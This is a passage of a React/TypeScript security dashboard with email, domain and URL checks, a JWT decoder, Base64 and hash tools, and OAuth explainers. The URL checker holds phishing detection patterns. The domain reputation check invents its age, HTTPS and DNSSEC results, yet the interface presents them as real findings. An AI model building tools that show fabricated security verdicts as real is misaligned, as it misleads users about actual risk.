/**
 * Trust Architect View Component
 * A comprehensive security and verification tool dashboard
 */

import { useState } from 'react'
import {
  Shield, Lock, Key, CheckCircle2, AlertTriangle, AlertCircle,
  Copy, Globe, Mail, User, FileText,
  Code, Hash, ShieldCheck, ShieldAlert, Info, ChevronRight,
  ChevronDown, Check, Fingerprint, BadgeCheck,
  Server, Database, Activity, TrendingUp, Award, Clock,
  BookOpen, AlertOctagon, Bug
} from 'lucide-react'

// ============== Types ==============

interface EmailValidation {
  email: string
  isValid: boolean
  format: boolean
  domain: string
  issues: string[]
  suggestions: string[]
}

interface DomainReputation {
  domain: string
  score: number
  age: string
  https: boolean
  dnssec: boolean
  issues: string[]
  category: string
}

interface URLSafetyAnalysis {
  url: string
  isHttps: boolean
  domain: string
  riskLevel: 'safe' | 'caution' | 'warning' | 'danger'
  score: number
  issues: string[]
  recommendations: string[]
  phishingIndicators: string[]
}

interface JWTDecoded {
  header: Record<string, unknown>
  payload: Record<string, unknown>
  signature: string
  isExpired: boolean
  expiresAt: string | null
  issuedAt: string | null
}

interface SecurityCheckItem {
  id: string
  category: string
  title: string
  description: string
  severity: 'critical' | 'high' | 'medium' | 'low'
  checked: boolean
}

interface VulnerabilityInfo {
  id: string
  name: string
  severity: 'critical' | 'high' | 'medium' | 'low'
  description: string
  prevention: string[]
  examples: string[]
}

// ============== Utility Functions ==============

// Email Validation
function validateEmail(email: string): EmailValidation {
  const issues: string[] = []
  const suggestions: string[] = []

  // Basic format check
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
  const isValidFormat = emailRegex.test(email)

  if (!isValidFormat) {
    issues.push('Invalid email format')
  }

  // Extract domain
  const parts = email.split('@')
  const domain = parts[1] || ''

  // Check for common issues
  if (email.includes('..')) {
    issues.push('Contains consecutive dots')
  }

  if (email.startsWith('.') || email.endsWith('.')) {
    issues.push('Cannot start or end with a dot')
  }

  if (/[<>()[\]\\,;:\s]/.test(email)) {
    issues.push('Contains invalid special characters')
  }

  // Domain checks
  if (domain) {
    const suspiciousTLDs = ['xyz', 'top', 'work', 'click', 'link', 'gq', 'ml', 'cf', 'tk']
    const tld = domain.split('.').pop()?.toLowerCase()
    if (tld && suspiciousTLDs.includes(tld)) {
      issues.push('Domain uses suspicious TLD often associated with spam')
    }

    // Typosquatting check for common domains
    const similarDomains: Record<string, string[]> = {
      'gmail.com': ['gmai.com', 'gmial.com', 'gnail.com', 'gmali.com'],
      'yahoo.com': ['yaho.com', 'yahooo.com', 'yhoo.com'],
      'outlook.com': ['outloo.com', 'outlok.com', 'outllook.com'],
      'hotmail.com': ['hotmal.com', 'hotmai.com', 'hotamil.com']
    }

    for (const [correct, typos] of Object.entries(similarDomains)) {
      if (typos.includes(domain.toLowerCase())) {
        issues.push(`Possible typo - did you mean ${correct}?`)
        suggestions.push(`Use ${correct} instead of ${domain}`)
      }
    }

    // Disposable email check
    const disposableDomains = ['tempmail.com', 'throwaway.email', '10minutemail.com', 'guerrillamail.com', 'mailinator.com']
    if (disposableDomains.some(d => domain.toLowerCase().includes(d.split('.')[0]))) {
      issues.push('Appears to be a disposable email address')
    }
  }

  if (issues.length === 0) {
    suggestions.push('Email format appears valid')
  }

  return {
    email,
    isValid: issues.length === 0 && isValidFormat,
    format: isValidFormat,
    domain,
    issues,
    suggestions
  }
}

// Domain Reputation Analyzer
function analyzeDomainReputation(domain: string): DomainReputation {
  const issues: string[] = []
  let score = 100

  // Check if it's an IP address
  if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(domain)) {
    issues.push('Domain is an IP address - typically suspicious')
    score -= 40
  }

  // Check domain structure
  const parts = domain.split('.')
  if (parts.length > 4) {
    issues.push('Excessive subdomains - may indicate phishing')
    score -= 20
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    { pattern: /^[a-z0-9]{20,}\./, msg: 'Very long random subdomain' },
    { pattern: /login|signin|secure|account|verify|update/i, msg: 'Contains sensitive keywords' },
    { pattern: /\d{4,}/, msg: 'Contains long number sequences' },
    { pattern: /-{2,}/, msg: 'Contains multiple consecutive hyphens' }
  ]

  for (const { pattern, msg } of suspiciousPatterns) {
    if (pattern.test(domain)) {
      issues.push(msg)
      score -= 15
    }
  }

  // Check TLD reputation
  const trustedTLDs = ['com', 'org', 'net', 'edu', 'gov', 'io', 'co', 'dev']
  const suspiciousTLDs = ['xyz', 'top', 'work', 'click', 'link', 'gq', 'ml', 'cf', 'tk', 'buzz', 'icu']
  const tld = parts[parts.length - 1]?.toLowerCase()

  if (suspiciousTLDs.includes(tld)) {
    issues.push('Uses TLD commonly associated with spam/malware')
    score -= 25
  }

  // Categorize domain
  let category = 'Unknown'
  const wellKnownDomains: Record<string, string> = {
    'google.com': 'Technology', 'facebook.com': 'Social Media', 'amazon.com': 'E-commerce',
    'microsoft.com': 'Technology', 'apple.com': 'Technology', 'github.com': 'Developer',
    'stackoverflow.com': 'Developer', 'linkedin.com': 'Professional', 'twitter.com': 'Social Media'
  }

  const baseDomain = parts.slice(-2).join('.')
  category = wellKnownDomains[baseDomain] || (trustedTLDs.includes(tld) ? 'General' : 'Unverified')

  // Simulate age (in real implementation, would use WHOIS)
  const domainAges = ['1+ years', '5+ years', '10+ years', '< 6 months', '6-12 months']
  const ageIndex = Math.abs(domain.length % domainAges.length)
  const age = domainAges[ageIndex]

  if (age === '< 6 months') {
    issues.push('Domain appears to be newly registered')
    score -= 10
  }

  return {
    domain,
    score: Math.max(0, score),
    age,
    https: true, // Would check in real implementation
    dnssec: score > 70, // Simulated
    issues,
    category
  }
}

// URL Safety Analyzer
function analyzeURLSafety(urlString: string): URLSafetyAnalysis {
  const issues: string[] = []
  const recommendations: string[] = []
  const phishingIndicators: string[] = []
  let score = 100

  try {
    // Add protocol if missing
    let fullUrl = urlString
    if (!urlString.startsWith('http://') && !urlString.startsWith('https://')) {
      fullUrl = 'https://' + urlString
    }

    const url = new URL(fullUrl)
    const isHttps = url.protocol === 'https:'

    // HTTPS check
    if (!isHttps) {
      issues.push('Not using HTTPS encryption')
      phishingIndicators.push('Unencrypted connection')
      score -= 30
    }

    // Domain analysis
    const domain = url.hostname

    // Check for IP-based URL
    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(domain)) {
      issues.push('Uses IP address instead of domain name')
      phishingIndicators.push('IP-based URL')
      score -= 30
    }

    // Check for suspicious URL patterns
    const suspiciousPatterns = [
      { pattern: /@/, msg: 'Contains @ symbol - may redirect to different site', indicator: '@ symbol redirect' },
      { pattern: /data:/, msg: 'Uses data URI scheme', indicator: 'Data URI' },
      { pattern: /javascript:/i, msg: 'Contains JavaScript code', indicator: 'JavaScript execution' },
      { pattern: /\.exe|\.zip|\.rar|\.7z|\.msi|\.dmg/i, msg: 'Links to executable/archive file', indicator: 'File download' }
    ]

    for (const { pattern, msg, indicator } of suspiciousPatterns) {
      if (pattern.test(fullUrl)) {
        issues.push(msg)
        phishingIndicators.push(indicator)
        score -= 20
      }
    }

    // Check for brand impersonation
    const brands = ['google', 'facebook', 'amazon', 'apple', 'microsoft', 'paypal', 'netflix', 'instagram', 'twitter', 'linkedin']
    for (const brand of brands) {
      if (domain.includes(brand) && !domain.endsWith(`.${brand}.com`) && domain !== `${brand}.com` && domain !== `www.${brand}.com`) {
        issues.push(`May be impersonating ${brand}`)
        phishingIndicators.push('Brand impersonation')
        score -= 25
      }
    }

    // URL length check
    if (fullUrl.length > 200) {
      issues.push('Unusually long URL')
      phishingIndicators.push('URL obfuscation')
      score -= 10
    }

    // Multiple subdomains
    const subdomains = domain.split('.').length - 2
    if (subdomains > 2) {
      issues.push('Multiple subdomains detected')
      score -= 10
    }

    // Path analysis
    if (/login|signin|account|verify|secure|update|confirm|password/i.test(url.pathname)) {
      recommendations.push('Be cautious - URL contains sensitive action keywords')
    }

    // Generate recommendations
    if (!isHttps) {
      recommendations.push('Avoid entering sensitive data on non-HTTPS sites')
    }

    if (issues.length === 0) {
      recommendations.push('URL appears safe, but always verify sender/source')
    } else {
      recommendations.push('Verify the URL before clicking')
      recommendations.push('Check the actual destination in browser status bar')
    }

    // Determine risk level
    let riskLevel: 'safe' | 'caution' | 'warning' | 'danger' = 'safe'
    if (score < 50) riskLevel = 'danger'
    else if (score < 70) riskLevel = 'warning'
    else if (score < 90) riskLevel = 'caution'

    return {
      url: fullUrl,
      isHttps,
      domain,
      riskLevel,
      score: Math.max(0, score),
      issues,
      recommendations,
      phishingIndicators
    }
  } catch {
    return {
      url: urlString,
      isHttps: false,
      domain: 'Invalid',
      riskLevel: 'danger',
      score: 0,
      issues: ['Invalid URL format'],
      recommendations: ['Enter a valid URL'],
      phishingIndicators: []
    }
  }
}

// JWT Decoder
function decodeJWT(token: string): JWTDecoded | null {
  try {
    const parts = token.split('.')
    if (parts.length !== 3) {
      return null
    }

    const decodeBase64 = (str: string) => {
      // Handle URL-safe base64
      const base64 = str.replace(/-/g, '+').replace(/_/g, '/')
      const padded = base64 + '='.repeat((4 - base64.length % 4) % 4)
      return JSON.parse(atob(padded))
    }

    const header = decodeBase64(parts[0])
    const payload = decodeBase64(parts[1])

    // Check expiration
    const exp = payload.exp as number | undefined
    const iat = payload.iat as number | undefined

    let isExpired = false
    let expiresAt: string | null = null
    let issuedAt: string | null = null

    if (exp) {
      const expDate = new Date(exp * 1000)
      isExpired = expDate < new Date()
      expiresAt = expDate.toLocaleString()
    }

    if (iat) {
      issuedAt = new Date(iat * 1000).toLocaleString()
    }

    return {
      header,
      payload,
      signature: parts[2],
      isExpired,
      expiresAt,
      issuedAt
    }
  } catch {
    return null
  }
}

// Base64 Encoder/Decoder
function encodeBase64(input: string): string {
  try {
    return btoa(unescape(encodeURIComponent(input)))
  } catch {
    return 'Error: Invalid input'
  }
}

function decodeBase64(input: string): string {
  try {
    return decodeURIComponent(escape(atob(input)))
  } catch {
    return 'Error: Invalid Base64 string'
  }
}

// Hash Generator (using SubtleCrypto)
async function generateHash(input: string, algorithm: 'MD5' | 'SHA-256' | 'SHA-1' | 'SHA-512'): Promise<string> {
  if (algorithm === 'MD5') {
    // MD5 is not supported by SubtleCrypto, use a simple implementation
    return md5(input)
  }

  const encoder = new TextEncoder()
  const data = encoder.encode(input)
  const hashBuffer = await crypto.subtle.digest(algorithm, data)
  const hashArray = Array.from(new Uint8Array(hashBuffer))
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('')
}

// Simple MD5 implementation
function md5(string: string): string {
  function rotateLeft(value: number, shift: number): number {
    return (value << shift) | (value >>> (32 - shift))
  }

  function addUnsigned(x: number, y: number): number {
    return (x + y) >>> 0
  }

  const message = unescape(encodeURIComponent(string))
  const messageLength = message.length

  // Padding
  const wordArray: number[] = []
  for (let i = 0; i < messageLength; i++) {
    wordArray[i >> 2] |= (message.charCodeAt(i) & 0xff) << ((i % 4) * 8)
  }
  wordArray[messageLength >> 2] |= 0x80 << ((messageLength % 4) * 8)

  const wordsNeeded = (((messageLength + 8) >>> 6) + 1) * 16
  while (wordArray.length < wordsNeeded) {
    wordArray.push(0)
  }
  wordArray[wordsNeeded - 2] = (messageLength * 8) >>> 0
  wordArray[wordsNeeded - 1] = (messageLength * 8) / 4294967296 >>> 0

  // Initialize hash values
  let a = 0x67452301
  let b = 0xefcdab89
  let c = 0x98badcfe
  let d = 0x10325476

  const k = [
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391
  ]

  const s = [
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
    5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
  ]

  for (let i = 0; i < wordsNeeded; i += 16) {
    const aa = a, bb = b, cc = c, dd = d

    for (let j = 0; j < 64; j++) {
      let f: number, g: number

      if (j < 16) {
        f = (b & c) | ((~b) & d)
        g = j
      } else if (j < 32) {
        f = (d & b) | ((~d) & c)
        g = (5 * j + 1) % 16
      } else if (j < 48) {
        f = b ^ c ^ d
        g = (3 * j + 5) % 16
      } else {
        f = c ^ (b | (~d))
        g = (7 * j) % 16
      }

      const temp = d
      d = c
      c = b
      b = addUnsigned(b, rotateLeft(addUnsigned(addUnsigned(a, f), addUnsigned(k[j], wordArray[i + g])), s[j]))
      a = temp
    }

    a = addUnsigned(a, aa)
    b = addUnsigned(b, bb)
    c = addUnsigned(c, cc)
    d = addUnsigned(d, dd)
  }

  const toHex = (n: number) => {
    let hex = ''
    for (let i = 0; i < 4; i++) {
      hex += ((n >> (i * 8)) & 0xff).toString(16).padStart(2, '0')
    }
    return hex
  }

  return toHex(a) + toHex(b) + toHex(c) + toHex(d)
}

// ============== Sub-Components ==============

function TabButton({ active, onClick, icon: Icon, label }: {
  active: boolean
  onClick: () => void
  icon: typeof Shield
  label: string
}) {
  return (
    <button
      onClick={onClick}
      className={`flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-medium transition-all ${
        active
          ? 'bg-rose-gold-400/20 text-rose-gold-400 border border-rose-gold-400/30'
          : 'text-white/60 hover:text-white hover:bg-white/5'
      }`}
    >
      <Icon className="w-4 h-4" />
      {label}
    </button>
  )
}

function StatCard({ icon: Icon, label, value, trend, color = 'rose' }: {
  icon: typeof Shield
  label: string
  value: string | number
  trend?: string
  color?: string
}) {
  const colorClasses: Record<string, string> = {
    rose: 'from-rose-gold-400/20 to-rose-gold-600/20 border-rose-gold-400/30 text-rose-gold-400',
    green: 'from-green-400/20 to-green-600/20 border-green-500/30 text-green-400',
    yellow: 'from-yellow-400/20 to-yellow-600/20 border-yellow-500/30 text-yellow-400',
    red: 'from-red-400/20 to-red-600/20 border-red-500/30 text-red-400',
      }

  return (
    <div className={`morphic-card p-4 rounded-xl bg-gradient-to-br ${colorClasses[color]} border`}>
      <div className="flex items-center gap-3">
        <Icon className="w-5 h-5" />
        <div className="flex-1">
          <p className="text-xs text-white/60">{label}</p>
          <div className="flex items-center gap-2">
            <p className="text-lg font-bold">{value}</p>
            {trend && (
              <span className="text-xs flex items-center gap-1">
                <TrendingUp className="w-3 h-3" />
                {trend}
              </span>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

// ============== Verification Systems Tab ==============

function VerificationSystems() {
  const [email, setEmail] = useState('')
  const [emailValidation, setEmailValidation] = useState<EmailValidation | null>(null)
  const [domain, setDomain] = useState('')
  const [domainReputation, setDomainReputation] = useState<DomainReputation | null>(null)
  const [url, setUrl] = useState('')
  const [urlAnalysis, setUrlAnalysis] = useState<URLSafetyAnalysis | null>(null)

  const handleValidateEmail = () => {
    if (email.trim()) {
      setEmailValidation(validateEmail(email.trim()))
    }
  }

  const handleAnalyzeDomain = () => {
    if (domain.trim()) {
      setDomainReputation(analyzeDomainReputation(domain.trim().toLowerCase()))
    }
  }

  const handleAnalyzeURL = () => {
    if (url.trim()) {
      setUrlAnalysis(analyzeURLSafety(url.trim()))
    }
  }

  const getScoreColor = (score: number) => {
    if (score >= 80) return 'text-green-400'
    if (score >= 60) return 'text-yellow-400'
    if (score >= 40) return 'text-orange-400'
    return 'text-red-400'
  }

  const getRiskColor = (risk: 'safe' | 'caution' | 'warning' | 'danger') => {
    const colors = {
      safe: 'text-green-400 bg-green-500/20 border-green-500/30',
      caution: 'text-yellow-400 bg-yellow-500/20 border-yellow-500/30',
      warning: 'text-orange-400 bg-orange-500/20 border-orange-500/30',
      danger: 'text-red-400 bg-red-500/20 border-red-500/30'
    }
    return colors[risk]
  }

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-2 gap-6">
        {/* Email Verification */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Mail className="w-5 h-5 text-rose-gold-400" />
            Email Verification
          </h3>

          <div className="space-y-4">
            <div className="flex gap-2">
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleValidateEmail()}
                placeholder="Enter email to verify"
                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2.5 text-white text-sm placeholder-white/30"
              />
              <button
                onClick={handleValidateEmail}
                className="morphic-btn bg-rose-gold-400/20 text-rose-gold-400 border-rose-gold-400/30 hover:bg-rose-gold-400/30 px-4 py-2 text-sm"
              >
                Verify
              </button>
            </div>

            {emailValidation && (
              <div className={`p-4 rounded-lg border ${emailValidation.isValid ? 'bg-green-500/10 border-green-500/30' : 'bg-red-500/10 border-red-500/30'}`}>
                <div className="flex items-center gap-2 mb-3">
                  {emailValidation.isValid ? (
                    <CheckCircle2 className="w-5 h-5 text-green-400" />
                  ) : (
                    <AlertCircle className="w-5 h-5 text-red-400" />
                  )}
                  <span className={`font-medium ${emailValidation.isValid ? 'text-green-400' : 'text-red-400'}`}>
                    {emailValidation.isValid ? 'Valid Email' : 'Invalid Email'}
                  </span>
                </div>

                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-white/60">Domain:</span>
                    <span className="text-white">{emailValidation.domain || 'N/A'}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-white/60">Format:</span>
                    <span className={emailValidation.format ? 'text-green-400' : 'text-red-400'}>
                      {emailValidation.format ? 'Valid' : 'Invalid'}
                    </span>
                  </div>
                </div>

                {emailValidation.issues.length > 0 && (
                  <div className="mt-3 pt-3 border-t border-white/10">
                    <p className="text-xs text-white/60 mb-2">Issues:</p>
                    {emailValidation.issues.map((issue, i) => (
                      <div key={i} className="flex items-center gap-2 text-xs text-red-400">
                        <AlertTriangle className="w-3 h-3" />
                        {issue}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>

        {/* Domain Reputation */}
        <div className="morphic-card p-6 rounded-xl">
          <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Globe className="w-5 h-5 text-rose-gold-400" />
            Domain Reputation
          </h3>

          <div className="space-y-4">
            <div className="flex gap-2">
              <input
                type="text"
                value={domain}
                onChange={(e) => setDomain(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleAnalyzeDomain()}
                placeholder="Enter domain (e.g., example.com)"
                className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-2.5 text-white text-sm placeholder-white/30"
              />
              <button
                onClick={handleAnalyzeDomain}
                className="morphic-btn px-4 py-2 text-sm"
              >
                Analyze
              </button>
            </div>

            {domainReputation && (
              <div className="p-4 rounded-lg bg-white/5 border border-white/10">
                <div className="flex items-center justify-between mb-3">
                  <span className="text-white font-medium">{domainReputation.domain}</span>
                  <span className={`text-2xl font-bold ${getScoreColor(domainReputation.score)}`}>
                    {domainReputation.score}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2 text-sm mb-3">
                  <div className="flex items-center gap-2">
                    <Clock className="w-4 h-4 text-white/40" />
                    <span className="text-white/60">Age:</span>
                    <span className="text-white">{domainReputation.age}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Server className="w-4 h-4 text-white/40" />
                    <span className="text-white/60">Category:</span>
                    <span className="text-white">{domainReputation.category}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    {domainReputation.https ? (
                      <Lock className="w-4 h-4 text-green-400" />
                    ) : (
                      <AlertTriangle className="w-4 h-4 text-red-400" />
                    )}
                    <span className="text-white/60">HTTPS:</span>
                    <span className={domainReputation.https ? 'text-green-400' : 'text-red-400'}>
                      {domainReputation.https ? 'Yes' : 'No'}
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    {domainReputation.dnssec ? (
                      <ShieldCheck className="w-4 h-4 text-green-400" />
                    ) : (
                      <ShieldAlert className="w-4 h-4 text-yellow-400" />
                    )}
                    <span className="text-white/60">DNSSEC:</span>
                    <span className={domainReputation.dnssec ? 'text-green-400' : 'text-yellow-400'}>
                      {domainReputation.dnssec ? 'Enabled' : 'Unknown'}
                    </span>
                  </div>
                </div>

                {domainReputation.issues.length > 0 && (
                  <div className="pt-3 border-t border-white/10">
                    <p className="text-xs text-white/60 mb-2">Issues:</p>
                    {domainReputation.issues.map((issue, i) => (
                      <div key={i} className="flex items-center gap-2 text-xs text-yellow-400">
                        <AlertTriangle className="w-3 h-3" />
                        {issue}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* URL Safety Analyzer */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <ShieldCheck className="w-5 h-5 text-rose-gold-400" />
          URL Safety Analyzer
        </h3>

        <div className="flex gap-3 mb-4">
          <input
            type="text"
            value={url}
            onChange={(e) => setUrl(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleAnalyzeURL()}
            placeholder="Enter URL to analyze (e.g., https://example.com/login)"
            className="flex-1 bg-white/5 border border-white/10 rounded-lg px-4 py-3 text-white text-sm placeholder-white/30"
          />
          <button
            onClick={handleAnalyzeURL}
            className="morphic-btn bg-rose-gold-400/20 text-rose-gold-400 border-rose-gold-400/30 hover:bg-rose-gold-400/30 px-6 py-3 text-sm"
          >
            Analyze URL
          </button>
        </div>

        {urlAnalysis && (
          <div className="grid grid-cols-3 gap-4">
            {/* Score Card */}
            <div className={`p-4 rounded-lg border ${getRiskColor(urlAnalysis.riskLevel)}`}>
              <div className="text-center">
                <div className={`text-4xl font-bold mb-1 ${getScoreColor(urlAnalysis.score)}`}>
                  {urlAnalysis.score}
                </div>
                <div className="text-xs text-white/60">Safety Score</div>
                <div className={`mt-2 text-sm font-medium uppercase ${getRiskColor(urlAnalysis.riskLevel).split(' ')[0]}`}>
                  {urlAnalysis.riskLevel}
                </div>
              </div>
            </div>

            {/* Issues */}
            <div className="p-4 rounded-lg bg-white/5 border border-white/10">
              <h4 className="text-sm font-medium text-white/60 mb-2 flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 text-yellow-400" />
                Issues Found
              </h4>
              {urlAnalysis.issues.length > 0 ? (
                <div className="space-y-1">
                  {urlAnalysis.issues.map((issue, i) => (
                    <div key={i} className="text-xs text-red-400 flex items-start gap-1">
                      <span className="mt-0.5">-</span>
                      {issue}
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-xs text-green-400">No issues detected</p>
              )}
            </div>

            {/* Phishing Indicators */}
            <div className="p-4 rounded-lg bg-white/5 border border-white/10">
              <h4 className="text-sm font-medium text-white/60 mb-2 flex items-center gap-2">
                <Fingerprint className="w-4 h-4 text-rose-gold-400" />
                Phishing Indicators
              </h4>
              {urlAnalysis.phishingIndicators.length > 0 ? (
                <div className="space-y-1">
                  {urlAnalysis.phishingIndicators.map((indicator, i) => (
                    <div key={i} className="text-xs text-orange-400 flex items-start gap-1">
                      <span className="mt-0.5">-</span>
                      {indicator}
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-xs text-green-400">No phishing indicators</p>
              )}
            </div>
          </div>
        )}

        {!urlAnalysis && (
          <div className="text-center py-8 text-white/40">
            <Globe className="w-12 h-12 mx-auto mb-3 opacity-50" />
            <p className="text-sm">Enter a URL to analyze its safety and check for phishing indicators</p>
          </div>
        )}
      </div>

      {/* Identity Verification Concepts */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <BadgeCheck className="w-5 h-5 text-rose-gold-400" />
          Identity Verification Concepts
        </h3>

        <div className="grid grid-cols-3 gap-4">
          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <div className="flex items-center gap-2 mb-2">
              <Fingerprint className="w-5 h-5 text-rose-gold-400" />
              <h4 className="font-medium text-white">Biometric</h4>
            </div>
            <p className="text-xs text-white/60">
              Fingerprint, facial recognition, iris scanning, and voice recognition provide unique biological identifiers.
            </p>
          </div>

          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <div className="flex items-center gap-2 mb-2">
              <Key className="w-5 h-5 text-rose-gold-400" />
              <h4 className="font-medium text-white">Knowledge-Based</h4>
            </div>
            <p className="text-xs text-white/60">
              Passwords, PINs, security questions, and personal information that only the user should know.
            </p>
          </div>

          <div className="p-4 rounded-lg bg-white/5 border border-white/10">
            <div className="flex items-center gap-2 mb-2">
              <User className="w-5 h-5 text-rose-gold-400" />
              <h4 className="font-medium text-white">Possession-Based</h4>
            </div>
            <p className="text-xs text-white/60">
              Hardware tokens, smart cards, mobile devices, and authenticator apps that the user physically possesses.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

// ============== Authentication Tools Tab ==============

function AuthenticationTools() {
  const [jwtInput, setJwtInput] = useState('')
  const [jwtDecoded, setJwtDecoded] = useState<JWTDecoded | null>(null)
  const [jwtError, setJwtError] = useState('')

  const [base64Input, setBase64Input] = useState('')
  const [base64Output, setBase64Output] = useState('')
  const [base64Mode, setBase64Mode] = useState<'encode' | 'decode'>('encode')

  const [hashInput, setHashInput] = useState('')
  const [hashAlgorithm, setHashAlgorithm] = useState<'MD5' | 'SHA-1' | 'SHA-256' | 'SHA-512'>('SHA-256')
  const [hashOutput, setHashOutput] = useState('')

  const [copiedItem, setCopiedItem] = useState<string | null>(null)

  const handleDecodeJWT = () => {
    if (!jwtInput.trim()) {
      setJwtError('Please enter a JWT token')
      setJwtDecoded(null)
      return
    }

    const decoded = decodeJWT(jwtInput.trim())
    if (decoded) {
      setJwtDecoded(decoded)
      setJwtError('')
    } else {
      setJwtError('Invalid JWT format. JWT should have 3 parts separated by dots.')
      setJwtDecoded(null)
    }
  }

  const handleBase64 = () => {
    if (base64Mode === 'encode') {
      setBase64Output(encodeBase64(base64Input))
    } else {
      setBase64Output(decodeBase64(base64Input))
    }
  }

  const handleGenerateHash = async () => {
    if (hashInput.trim()) {
      const hash = await generateHash(hashInput, hashAlgorithm)
      setHashOutput(hash)
    }
  }

  const copyToClipboard = async (text: string, itemId: string) => {
    await navigator.clipboard.writeText(text)
    setCopiedItem(itemId)
    setTimeout(() => setCopiedItem(null), 2000)
  }

  return (
    <div className="space-y-6">
      {/* OAuth Flow Explainer */}
      <div className="morphic-card p-6 rounded-xl">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <Key className="w-5 h-5 text-rose-gold-400" />
          OAuth 2.0 Flow Explainer
        </h3>

        <div className="grid grid-cols-4 gap-3">
          <div className="p-4 rounded-lg bg-rose-gold-400/10 border border-rose-gold-400/30 text-center">
            <div className="w-8 h-8 rounded-full bg-rose-gold-400/20 mx-auto mb-2 flex items-center justify-center text-rose-gold-400 font-bold">1</div>
            <h4 className="text-sm font-medium text-white mb-1">Authorization Request</h4>
            <p className="text-xs text-white/60">User clicks "Login with Provider" and is redirected to authorization server</p>
          </div>

          <div className="p-4 rounded-lg bg-rose-gold-400/10 border border-rose-gold-400/30 text-center">
            <div className="w-8 h-8 rounded-full bg-rose-gold-400/20 mx-auto mb-2 flex items-center justify-center text-rose-gold-400 font-bold">2</div>
            <h4 className="text-sm font-medium text-white mb-1">User Consent</h4>
            <p className="text-xs text-white/60">User authenticates and grants permissions to the application</p>
          </div>

          <div className="p-4 rounded-lg bg-rose-gold-400/10 border border-rose-gold-400/30 text-center">
            <div className="w-8 h-8 rounded-full bg-rose-gold-400/20 mx-auto mb-2 flex items-center justify-center text-rose-gold-400 font-bold">3</div>
            <h4 className="text-sm font-medium text-white mb-1">Authorization Code</h4>
            <p className="text-xs text-white/60">Server redirects back with authorization code</p>
          </div>

          <div className="p-4 rounded-lg bg-rose-gold-400/10 border border-rose-gold-400/30 text-center">
            <div className="w-8 h-8 rounded-full bg-rose-gold-400/20 mx-auto mb-2 flex items-center justify-center text-rose-gold-400 font-bold">4</div>
            <h4 className="text-sm font-medium text-white mb-1">Token Exchange</h4>
            <p className="text-xs text-white/60">App exchanges code for access token to make API calls</p>
          </div>
        </div>

        <div className="mt-4 p-4 rounded-lg bg-white/5 border border-white/10">
          <h4 className="text-sm font-medium text-white mb-2">Key OAuth Concepts:</h4>
          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="flex items-start gap-2">
              <span className="text-rose-gold-400">-</span>
              <span className="text-white/80"><strong>Access Token:</strong> Short-lived token for API access</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-rose-gold-400">-</span>
              <span className="text-white/80"><strong>Refresh Token:</strong> Long-lived token to get new access tokens</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-rose-gold-400">-</span>
